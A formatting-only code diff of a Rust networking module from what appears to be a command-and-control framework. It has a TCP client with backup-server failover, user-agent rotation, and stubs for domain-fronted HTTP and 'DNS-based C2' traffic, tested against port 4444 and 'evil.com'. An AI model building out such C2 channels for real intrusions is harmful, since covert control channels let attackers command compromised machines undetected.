@@ -1,7 +1,7 @@
 use nexus_common::*;
 use std::time::Duration;
-use tokio::net::TcpStream;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
+use tokio::net::TcpStream;
 use tokio::time::timeout;
 
 pub struct NetworkClient {
@@ -34,27 +34,30 @@ impl NetworkClient {
         // Establish connection with timeout
         let mut stream = timeout(
             self.connection_timeout,
-            TcpStream::connect(&self.server_addr)
-        ).await
+            TcpStream::connect(&self.server_addr),
+        )
+        .await
         .map_err(|_| NexusError::NetworkError("Connection timeout".to_string()))?
         .map_err(|e| NexusError::NetworkError(format!("Connection failed: {}", e)))?;
 
         // Send the encrypted message
         let message_bytes = encrypted_message.as_bytes();
-        stream.write_all(message_bytes).await
+        stream
+            .write_all(message_bytes)
+            .await
             .map_err(|e| NexusError::NetworkError(format!("Write failed: {}", e)))?;
 
         // Read response with timeout
         let mut response_buffer = vec![0u8; 8192]; // 8KB buffer
-        let bytes_read = timeout(
-            self.read_timeout,
-            stream.read(&mut response_buffer)
-        ).await
-        .map_err(|_| NexusError::NetworkError("Read timeout".to_string()))?
-        .map_err(|e| NexusError::NetworkError(format!("Read failed: {}", e)))?;
+        let bytes_read = timeout(self.read_timeout, stream.read(&mut response_buffer))
+            .await
+            .map_err(|_| NexusError::NetworkError("Read timeout".to_string()))?
+            .map_err(|e| NexusError::NetworkError(format!("Read failed: {}", e)))?;
 
         if bytes_read == 0 {
-            return Err(NexusError::NetworkError("Server closed connection".to_string()));
+            return Err(NexusError::NetworkError(
+                "Server closed connection".to_string(),
+            ));
         }
 
         // Convert response to string
@@ -69,13 +72,16 @@ impl NetworkClient {
 
         let mut stream = timeout(
             self.connection_timeout,
-            TcpStream::connect(&self.server_addr)
-        ).await
+            TcpStream::connect(&self.server_addr),
+        )
+        .await
         .map_err(|_| NexusError::NetworkError("Connection timeout".to_string()))?
         .map_err(|e| NexusError::NetworkError(format!("Connection failed: {}", e)))?;
 
         let message_bytes = encrypted_message.as_bytes();
-        stream.write_all(message_bytes).await
+        stream
+            .write_all(message_bytes)
+            .await
             .map_err(|e| NexusError::NetworkError(format!("Write failed: {}", e)))?;
 
         // Graceful shutdown
@@ -87,8 +93,10 @@ impl NetworkClient {
     pub async fn test_connection(&self) -> bool {
         match timeout(
             self.connection_timeout,
-            TcpStream::connect(&self.server_addr)
-        ).await {
+            TcpStream::connect(&self.server_addr),
+        )
+        .await
+        {
             Ok(Ok(_)) => true,
             _ => false,
         }
@@ -143,9 +151,11 @@ impl HttpClient {
         // This is a placeholder implementation
         // In a real implementation, you would use reqwest or similar HTTP client
         // with proper domain fronting headers and SSL configuration
-        
+
         // For now, return an error indicating HTTP is not implemented
-        Err(NexusError::NetworkError("HTTP client not yet implemented".to_string()))
+        Err(NexusError::NetworkError(
+            "HTTP client not yet implemented".to_string(),
+        ))
     }
 
     fn generate_user_agent() -> String {
@@ -155,7 +165,7 @@ impl HttpClient {
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         ];
-        
+
         let index = rand::random::<usize>() % user_agents.len();
         user_agents[index].to_string()
     }
@@ -184,7 +194,9 @@ impl DnsClient {
     pub async fn send_dns_message(&self, _encrypted_message: &str) -> Result<String> {
         // Placeholder for DNS-based C2 communication
         // This would involve crafting DNS queries with embedded data
-        Err(NexusError::NetworkError("DNS client not yet implemented".to_string()))
+        Err(NexusError::NetworkError(
+            "DNS client not yet implemented".to_string(),
+        ))
     }
 }
 
@@ -239,7 +251,7 @@ impl ConnectionManager {
         // Try backup servers if primary fails
         for (index, backup_server) in self.backup_servers.iter().enumerate() {
             let mut backup_client = NetworkClient::new(backup_server.clone());
-            
+
             for retry in 0..self.max_retries {
                 match backup_client.send_message(encrypted_message).await {
                     Ok(response) => {
@@ -264,7 +276,7 @@ impl ConnectionManager {
     /// Check connectivity to all configured servers
     pub async fn check_all_servers(&self) -> Vec<(String, bool)> {
         let mut results = Vec::new();
-        
+
         // Check primary server
         let primary_addr = self.primary_client.get_server_addr().to_string();
         let primary_ok = self.primary_client.test_connection().await;
@@ -303,7 +315,7 @@ mod tests {
     async fn test_network_client_with_timeouts() {
         let client = NetworkClient::new("127.0.0.1:4444".to_string())
             .with_timeouts(Duration::from_secs(5), Duration::from_secs(10));
-        
+
         assert_eq!(client.connection_timeout, Duration::from_secs(5));
         assert_eq!(client.read_timeout, Duration::from_secs(10));
     }
@@ -313,7 +325,7 @@ mod tests {
         let mut manager = ConnectionManager::new("127.0.0.1:4444".to_string())
             .add_backup_server("127.0.0.1:4445".to_string())
             .add_backup_server("127.0.0.1:4446".to_string());
-        
+
         assert_eq!(manager.backup_servers.len(), 2);
         assert_eq!(manager.get_current_server(), "127.0.0.1:4444");
     }
@@ -327,9 +339,8 @@ mod tests {
 
     #[tokio::test]
     async fn test_dns_client_creation() {
-        let client = DnsClient::new("evil.com".to_string())
-            .with_dns_server("8.8.8.8".to_string());
-        
+        let client = DnsClient::new("evil.com".to_string()).with_dns_server("8.8.8.8".to_string());
+
         assert_eq!(client.domain, "evil.com");
         assert_eq!(client.dns_server, Some("8.8.8.8".to_string()));
     }
